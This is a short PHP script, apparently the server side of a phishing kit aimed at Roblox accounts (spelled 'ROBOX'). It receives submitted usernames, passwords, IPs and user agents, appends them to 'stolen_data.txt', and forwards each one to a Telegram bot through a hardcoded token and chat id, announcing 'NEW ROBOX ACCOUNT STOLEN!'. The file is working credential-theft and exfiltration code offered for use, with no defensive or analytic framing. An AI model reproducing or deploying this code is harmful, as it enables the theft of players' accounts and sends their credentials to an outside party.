<?php
// Включение ошибок для отладки
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Получение данных
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $username = $data['username'] ?? 'N/A';
    $password = $data['password'] ?? 'N/A';
    $ip = $data['ip'] ?? 'N/A';
    $user_agent = $data['user_agent'] ?? 'N/A';
    $timestamp = $data['timestamp'] ?? date('Y-m-d H:i:s');
    
    // Сохранение в файл
    $log_entry = "Time: $timestamp | IP: $ip | Username: $username | Password: $password | User Agent: $user_agent\n";
    file_put_contents('stolen_data.txt', $log_entry, FILE_APPEND);
    
    // Отправка в Telegram
    $telegram_token = '8353448194:AAHlCssHonJFRSXNathBzJwN49P1JCxCt6Q';
    $chat_id = '7245292276';
    
    $message = "🎯 *NEW ROBOX ACCOUNT STOLEN!*\n\n"
             . "👤 *Username:* `$username`\n"
             . "🔑 *Password:* `$password`\n"
             . "🌐 *IP Address:* `$ip`\n"
             . "🕒 *Time:* `$timestamp`\n"
             . "💻 *User Agent:* `$user_agent`";
    
    $url = "https://api.telegram.org/bot$telegram_token/sendMessage";
    $post_data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    // Отправка запроса
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    echo json_encode(['status' => 'success']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
}
?>
